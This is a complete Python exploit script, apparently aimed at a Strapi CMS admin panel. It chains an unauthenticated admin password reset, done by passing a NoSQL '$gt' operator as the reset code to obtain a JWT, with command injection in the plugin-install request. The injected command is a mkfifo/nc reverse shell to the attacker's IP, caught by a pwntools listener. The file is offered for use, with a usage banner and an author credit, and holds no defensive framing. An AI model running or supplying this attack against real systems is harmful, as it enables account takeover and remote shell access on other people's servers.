#!/usr/bin/python3

import signal
import requests
import json
from pwn import *

#Colors
class colors():
	GREEN = "\033[0;32m\033[1m"
	RED = "\033[0;31m\033[1m"
	BLUE = "\033[0;34m\033[1m"
	YELLOW = "\033[0;33m\033[1m"
	PURPLE = "\033[0;35m\033[1m"
	TURQUOISE = "\033[0;36m\033[1m"
	GRAY = "\033[0;37m\033[1m"
	END = "\033[0m"

def def_handler(sig, frame):
	print(colors.RED + "\n[!] Exiting..." + colors.END)
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 5:
	print(colors.RED + "\n[!] Usage: " + colors.YELLOW + "{} ".format(sys.argv[0]) + colors.RED + "<" + colors.BLUE + "EMAIL" + colors.RED + "> <" + colors.BLUE + "NEW_PASSWORD" + colors.RED +"> <" + colors.BLUE + "URL" + colors.RED + "> <" + colors.BLUE + "YOUR_IP" + colors.RED + ">" + colors.END)
	sys.exit(1)

s = requests.session()

email = sys.argv[1]
passwd = sys.argv[2]
url = sys.argv[3]
ip = sys.argv[4]
port = 443
resetURL = "/admin/plugins/users-permissions/auth/reset-password"

def makeRequest():
	global jwt

	p1 = log.progress(colors.GRAY + "Resetting password for" + colors.TURQUOISE + " [{}]".format(email) + colors.END)

	data = {
		"email": email,
		"url": "{}{}".format(url, resetURL)
	}

	try:
		s.post(url + resetURL, json=data)
		p1.success(colors.GREEN + "✓" + colors.END)
	except:
		p1.failure(colors.RED + "Couldn't reset the password :(" + colors.END)
		sys.exit(1)

	p2 = log.progress(colors.GRAY + "Setting new password for" + colors.TURQUOISE + " [{}]".format(email) + colors.END)

	setPass = {
		"code": {"$gt":0},
		"password": passwd,
		"passwordConfirmation": passwd
	}

	try:
		r = s.post("{}/admin/auth/reset-password".format(url), json=setPass)

		if "\"jwt\"" in r.text:
			p2.success(colors.GREEN + "✓" + colors.END)
			c = json.loads(r.text)
			jwt = c["jwt"]
			log.info(colors.YELLOW + "JWT: " + colors.GRAY + jwt + colors.END)

		else:
			p2.failure(colors.RED + "Couldn't set new password :(" + colors.END)
			sys.exit(1)
	except:
		p2.failure(colors.RED + "X" + colors.END)
		sys.exit(1)

def rce():
	global jwt

	headers = {"Authorization": "Bearer {}".format(jwt)}
	data = {
		"plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f)".format(ip, port),
		"port": "80"
	}

	r = requests.post("{}/admin/plugins/install".format(url), headers=headers, json=data)

if __name__ == '__main__':

	print(colors.GRAY + "\n\tBY " + colors.RED + "INVERTEBRADO" +  colors.GRAY + "\tGITHUB -> " + colors.RED + "https://github.com/invertebr4do" + colors.GRAY + "\tPERSONAL PAGE -> " + colors.RED + "https://invertebr4do.github.io\n\n" + colors.END)

	makeRequest()

	try:
		threading.Thread(target=rce).start()
	except:
		log.failure(colors.RED + "X" + colors.END)

	p1 = log.progress(colors.GRAY + "Waiting for connection" + colors.END)

	shell = listen(port, timeout=15).wait_for_connection()

	if shell.sock is None:
		p1.failure(colors.RED + "Couldn't obtain a shell :(" + colors.END)
		sys.exit(1)
	else:
		p1.success(colors.GREEN + "✓" + colors.END)

		time.sleep(2)
		shell.interactive()

		sys.exit()
